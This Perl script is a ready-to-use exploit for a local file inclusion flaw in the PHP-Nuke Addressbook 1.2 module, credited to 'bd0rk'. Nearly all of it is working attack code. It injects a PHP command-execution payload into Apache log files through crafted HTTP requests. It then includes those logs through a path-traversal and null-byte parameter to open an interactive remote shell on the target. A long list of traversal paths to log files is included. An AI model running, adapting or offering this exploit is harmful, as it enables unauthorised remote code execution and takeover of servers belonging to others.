#!Perl
#
#PHP-Nuke Module Addressbook 1.2 Local File Inclusion Exploit
#
#Vendor: http://www.sb-websoft.com/index.php?name=CmodsDownload&file=index&req=getit&lid=14
#
#Vulnerable Code: require_once("modules/$module_name/include/func.inc.php");
#
#Coded by bd0rk || SOH-Crew
#
#Greetz: str0ke, TheJT, saint, CodeR, rgod, Kacper
#

use IO::Socket;
use LWP::Simple;

#ripped

@apache=(
"../../../../../var/log/httpd/access_log",
"../../../../../var/log/httpd/error_log",
"../apache/logs/error.log",
"../apache/logs/access.log",
"../../apache/logs/error.log",
"../../apache/logs/access.log",
"../../../apache/logs/error.log",
"../../../apache/logs/access.log",
"../../../../apache/logs/error.log",
"../../../../apache/logs/access.log",
"../../../../../apache/logs/error.log",
"../../../../../apache/logs/access.log",
"../logs/error.log",
"../logs/access.log",
"../../logs/error.log",
"../../logs/access.log",
"../../../logs/error.log",
"../../../logs/access.log",
"../../../../logs/error.log",
"../../../../logs/access.log",
"../../../../../logs/error.log",
"../../../../../logs/access.log",
"../../../../../etc/httpd/logs/access_log",
"../../../../../etc/httpd/logs/access.log",
"../../../../../etc/httpd/logs/error_log",
"../../../../../etc/httpd/logs/error.log",
"../../.. /../../var/www/logs/access_log",
"../../../../../var/www/logs/access.log",
"../../../../../usr/local/apache/logs/access_log",
"../../../../../usr/local/apache/logs/access.log",
"../../../../../var/log/apache/access_log",
"../../../../../var/log/apache/access.log",
"../../../../../var/log/access_log",
"../../../../../var/www/logs/error_log",
"../../../../../var/www/logs/error.log",
"../../../../../usr/local/apache/logs/error_log",
"../../../../../usr/local/apache/logs/error.log",
"../../../../../var/log/apache/error_log",
"../../../../../var/log/apache/error.log",
"../../../../../var/log/access_log",
"../../../../../var/log/error_log"
);

if (@ARGV < 3) {
print "
PHP-Nuke Module Addressbook 1.2 Local File Inclusion Exploit
###############################################################
Usage: exploit.pl [victim] /modules/Addressbook/ [apachepath]
###############################################################
";
exit();
}

$host=$ARGV[0];
$path=$ARGV[1];
$apachepath=$ARGV[2];

print "Code is injecting in logfiles...\n";
$CODE="<?php ob_clean();system(\$HTTP_COOKIE_VARS[cmd]);die;?>";
$socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$host", PeerPort=>"80") or die "Connection failed.\n\n";
print $socket "GET ".$path.$CODE." HTTP/1.1\r\n";
print $socket "user-Agent: ".$CODE."\r\n";
print $socket "Host: ".$host."\r\n";
print $socket "Connection: close\r\n\r\n";
close($socket);
print "Write END to exit!\n";
print "If not working try another apache path\n\n";

print "[shell] ";$cmd = <STDIN>;

while($cmd !~ "END") {
$socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$host", PeerPort=>"80") or die "Connection failed.\n\n";

#now include parameter

print $socket "GET ".$path."addressbook.php?module_name=".$apache[$apachepath]."%00&cmd=$cmd HTTP/1.1\r\n";
print $socket "Host: ".$host."\r\n";
print $socket "Accept: */*\r\n";
print $socket "Connection: close\r\n\r\n";

while ($raspuns = <$socket>)
{

print $raspuns;
}

print "[shell] ";
$cmd = <STDIN>;
}
